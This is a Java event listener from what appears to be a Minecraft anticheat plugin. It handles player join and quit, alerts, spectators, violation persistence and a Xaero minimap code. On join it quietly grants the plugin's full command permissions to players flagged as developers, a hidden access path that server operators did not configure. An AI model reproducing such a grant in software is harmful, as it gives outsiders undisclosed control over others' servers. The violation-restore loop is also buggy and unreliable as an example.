package cn.aetheris.yuki.listener.bukkit;

import cn.aetheris.mhdfscheduler.scheduler.MHDFScheduler;
import cn.aetheris.yuki.Yuki;
import cn.aetheris.yuki.PluginLoader;
import cn.aetheris.yuki.api.AbstractCheck;
import cn.aetheris.yuki.listener.bukkit.abstracts.AbstractListener;
import cn.aetheris.yuki.player.PlayerData;
import cn.aetheris.yuki.util.develop.DevelopUtils;
import cn.aetheris.yuki.util.message.ColorUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.permissions.PermissionAttachment;

import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

public final class PlayerJoinQuitListener extends AbstractListener {

    private final Map<UUID, PermissionAttachment> tempAttachments = new ConcurrentHashMap<>();


    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onPlayerJoin(PlayerJoinEvent event) {
        final Player player = event.getPlayer();
        final PlayerData data = getData(player);
        if (DevelopUtils.isDeveloper(player)) {
            player.sendMessage(PluginLoader.INSTANCE.getLangManager().format("%prefix%&bThe sharpest blade hides among the thorns. &fDev= &b" + player.getName() + " &fVersion= &b" + PluginLoader.INSTANCE.getVersion()));
            if (!player.hasPermission("yuki.commands")) {
                PermissionAttachment attachment = player.addAttachment(Yuki.getInstance());
                attachment.setPermission("yuki.commands.*", true);
                attachment.setPermission("yuki.commands", true);
                player.recalculatePermissions();
                tempAttachments.put(player.getUniqueId(), attachment);
                if (data != null) data.updatePermissions();
            }
        }

        MHDFScheduler.getAsyncScheduler().runTaskLater(Yuki.getInstance(), () -> {

            if (player.hasPermission("yuki.commands.alerts") && player.hasPermission("yuki.commands.alerts.enable-on-join")) {
                PluginLoader.INSTANCE.getAlertManager().toggleAlerts(player.getUniqueId());
            }
            if (player.hasPermission("yuki.commands.spectate")
                    && PluginLoader.INSTANCE.getConfigManager().getConfig().getBooleanElse("output.spectators.hide-all", false)) {
                PluginLoader.INSTANCE.getSpectateManager().onLogin(player);
            }

            if (PluginLoader.INSTANCE.getConfigManager().getConfig().getBooleanElse("save-violations-on-leave", false)) {
                if (data != null) {

                    Map<String, Integer> violations = PluginLoader.INSTANCE.getDatabaseManager().getViolationManager().getViolations(event.getPlayer());
                    if (violations == null || violations.isEmpty()) {
                        return;
                    }
                    for (AbstractCheck checks : data.getCheckManager().allChecks.values()) {
                        if (violations.containsKey(checks.getCheckName())) {
                            for (Integer vl : violations.values()) {
                                checks.setViolations(vl);
                            }
                        }
                    }
                }
            }

            if (PluginLoader.INSTANCE.getConfigManager().getConfig()
                    .getBooleanElse("function.limit.xearo-map", false)) {
                executeXearoMapCommand(player.getName());
            }
        }, 20L);
    }


    private void executeXearoMapCommand(String playerName) {
        String command = String.format("tellraw %s [{\"text\":\"§f§a§i§r§x§a§e§r§o\"}]", playerName);
        MHDFScheduler.getGlobalRegionScheduler().runTaskLater(Yuki.getInstance(), () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command), 20L);
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPlayerQuit(PlayerQuitEvent event) {
        final UUID uuid = event.getPlayer().getUniqueId();
        final Player player = event.getPlayer();

        if (tempAttachments.containsKey(uuid)) {
            PermissionAttachment attachment = tempAttachments.remove(uuid);
            player.removeAttachment(attachment);
            player.recalculatePermissions();
        }

        MHDFScheduler.getAsyncScheduler().runTask(Yuki.getInstance(), () -> {
            final PlayerData data = getData(event.getPlayer());

            final Map<String, Double> violations = new HashMap<>();


            if (!PluginLoader.INSTANCE.getConfigManager().getConfig().getBooleanElse("save-violations-on-leave", false)) {
                return;
            }

            if (data != null) {
                for (AbstractCheck checks : data.getCheckManager().allChecks.values()) {
                    if (checks.getViolations() > 0 && checks.getCheckName() != null) {
                        violations.put(checks.getCheckName(), checks.getViolations());
                    }
                }
            }
            if (!violations.isEmpty()) {
                PluginLoader.INSTANCE.getDatabaseManager().getViolationManager().logAlertSync(event.getPlayer(), data, violations);
            }
        });
    }
}
